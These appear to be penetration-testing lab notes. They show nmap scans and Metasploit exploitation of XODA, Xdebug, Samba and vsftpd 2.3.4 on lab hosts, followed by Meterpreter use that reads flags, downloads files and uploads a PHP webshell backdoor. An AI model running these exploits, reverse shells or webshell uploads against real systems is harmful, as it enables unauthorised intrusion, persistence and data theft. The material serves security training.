# Metasploit

## Vulnerable web server (XODA)

nmap scan
```
nmap -sS -sV 192.103.226.3   
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-30 05:01 UTC
Nmap scan report for target-1 (192.103.226.3)
Host is up (0.000025s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
MAC Address: 02:42:C0:67:E2:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

Do a curl to find web app name - XODA
```
curl 192.103.226.3
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
```

Metasploit
```
msf5 > use exploit/unix/webapp/xoda_file_upload
msf5 exploit(unix/webapp/xoda_file_upload) > set RHOSTS 192.103.226.3
RHOSTS => 192.103.226.3
msf5 exploit(unix/webapp/xoda_file_upload) > set LHOSTS 192.103.226.2
LHOSTS => 192.103.226.2
msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf5 exploit(unix/webapp/xoda_file_upload) > run

[*] Started reverse TCP handler on 192.103.226.2:4444 
[*] Sending PHP payload (VyFtUyjj.php)
[*] Executing PHP payload (VyFtUyjj.php)
[*] Sending stage (38247 bytes) to 192.103.226.3
[*] Meterpreter session 1 opened (192.103.226.2:4444 -> 192.103.226.3:51376) at 2021-03-30 05:04:47 +0000
[!] Deleting VyFtUyjj.php

meterpreter > 
```

## Meterpreter basics


Endpoint found with dirb
```
dirb http://192.115.96.3
...

curl http://192.115.96.3/phpinfo.php
...
<tr><td class="e">DBGp - Common DeBuGger Protocol </td><td class="v">$Revision: 1.145 $ </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">xdebug.auto_trace</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">xdebug.cli_color</td><td class="v">0</td><td class="v">0</td></tr>
...
```

metasploit
```
msf5 > use exploit/unix/http/xdebug_unauth_exec
msf5 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS 192.115.96.3
RHOSTS => 192.115.96.3
msf5 exploit(unix/http/xdebug_unauth_exec) > set LHOST 192.115.96.2
LHOST => 192.115.96.2
msf5 exploit(unix/http/xdebug_unauth_exec) > run

[*] Started reverse TCP handler on 192.115.96.2:4444 
[*] 192.115.96.3:80 - Waiting for client response.
[*] 192.115.96.3:80 - Receiving response
[*] 192.115.96.3:80 - Shell might take upto a minute to respond.Please be patient.
[*] 192.115.96.3:80 - Sending payload of size 2026 bytes
[*] Sending stage (38247 bytes) to 192.115.96.3
[*] Meterpreter session 1 opened (192.115.96.2:4444 -> 192.115.96.3:58244) at 2021-03-30 08:29:00 +0000

meterpreter > 
```

Show remote present working directory and dir listing

```
meterpreter > pwd
/app
meterpreter > ls
Listing: /app
=============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   4096   dir   2016-02-15 10:35:00 +0000  .git
40755/rwxr-xr-x   4096   dir   2021-03-30 08:25:50 +0000  .xoda
100777/rwxrwxrwx  10273  fil   2016-02-15 10:35:00 +0000  LICENSE
100777/rwxrwxrwx  8703   fil   2018-10-05 18:41:42 +0000  README
...
```

Show local present working directory and dir listing

```
meterpreter > lpwd
/root
meterpreter > lls
Listing Local: /root
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  570   fil   2017-10-30 12:46:42 +0000  .bashrc
40700/rwx------   4096  dir   2021-03-30 08:26:03 +0000  .cache
40755/rwxr-xr-x   4096  dir   2021-03-30 08:28:16 +0000  .msf4
40755/rwxr-xr-x   4096  dir   2019-05-26 16:35:23 +0000  .npm
100644/rw-r--r--  148   fil   2017-10-30 12:46:42 +0000  .profile
100644/rw-r--r--  13    fil   2019-02-07 07:54:01 +0000  .vimrc
100644/rw-r--r--  165   fil   2019-05-26 16:35:28 +0000  .wget-hsts
100644/rw-r--r--  293   fil   2019-02-07 07:54:01 +0000  README
40755/rwxr-xr-x   4096  dir   2019-05-26 16:36:00 +0000  tools
40755/rwxr-xr-x   4096  dir   2019-02-07 07:54:01 +0000  wordlists
```

Change local dir
```
meterpreter > lcd tools
```

Read file
```
meterpreter > cat flag1
5c50a439f040922188a22f88cecc5277
```

Enter vim
```
meterpreter > edit flag1
```

Download files to local machine
```
meterpreter > download flag5.zip
[*] Downloading: flag5.zip -> flag5.zip
[*] Downloaded 208.00 B of 208.00 B (100.0%): flag5.zip -> flag5.zip
[*] download   : flag5.zip -> flag5.zip
```

Search for a file (with \*ackdo\*)
```
meterpreter > search -d /usr/bin -f *ckdo*
Found 1 result...
    /usr/bin\backdoor (66 bytes)
```

Upload file to remote machine
```
meterpreter > upload /usr/share/webshells/php/php-backdoor.php
[*] uploading  : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
[*] Uploaded -1.00 B of 2.73 KiB (-0.04%): /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
[*] uploaded   : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
```

## Vulnerable file sharing service (samba)

Start with nmap
```
nmap -sS -sV 192.235.103.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-30 08:43 UTC
Nmap scan report for target-1 (192.235.103.3)
Host is up (0.000014s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 02:42:C0:EB:67:03 (Unknown)
Service Info: Host: VICTIM-1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds
```

```
msf5 > use exploit/linux/samba/is_known_pipename
msf5 exploit(linux/samba/is_known_pipename) > set RHOSTS 192.235.103.3
RHOSTS => 192.235.103.3
msf5 exploit(linux/samba/is_known_pipename) > check

[+] 192.235.103.3:445 - Samba version 4.1.17 found with writeable share 'exploitable'
[*] 192.235.103.3:445 - The target appears to be vulnerable.
msf5 exploit(linux/samba/is_known_pipename) > run

[*] 192.235.103.3:445 - Using location \\192.235.103.3\exploitable\tmp for the path
[*] 192.235.103.3:445 - Retrieving the remote path of the share 'exploitable'
[*] 192.235.103.3:445 - Share 'exploitable' has server-side path '/
[*] 192.235.103.3:445 - Uploaded payload to \\192.235.103.3\exploitable\tmp\cDuRsmNf.so
[*] 192.235.103.3:445 - Loading the payload from server-side path /tmp/cDuRsmNf.so using \\PIPE\/tmp/cDuRsmNf.so...
[-] 192.235.103.3:445 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 192.235.103.3:445 - Loading the payload from server-side path /tmp/cDuRsmNf.so using /tmp/cDuRsmNf.so...
[+] 192.235.103.3:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.235.103.2:43389 -> 192.235.103.3:445) at 2021-03-30 08:46:12 +0000
```

## Vulnerable FTP server

Start with nmap
```
map -sS -sV 192.71.209.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-30 08:49 UTC
Nmap scan report for target-1 (192.71.209.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:C0:47:D1:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
```

Run nmap vuln script
```
nmap -p 21 --script vuln 192.71.209.3
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-30 08:50 UTC
Nmap scan report for target-1 (192.71.209.3)
Host is up (0.000044s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  OSVDB:73573  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root) groups=0(root)
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_      http://osvdb.org/73573
|_sslv2-drown: 
MAC Address: 02:42:C0:47:D1:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
```

Metasploit
```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.71.209.3
RHOSTS => 192.71.209.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.71.209.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.71.209.3:21 - USER: 331 Please specify the password.
[+] 192.71.209.3:21 - Backdoor service has been spawned, handling...
[+] 192.71.209.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.71.209.2:46819 -> 192.71.209.3:6200) at 2021-03-30 08:51:14 +0000

id
uid=0(root) gid=0(root) groups=0(root)
```
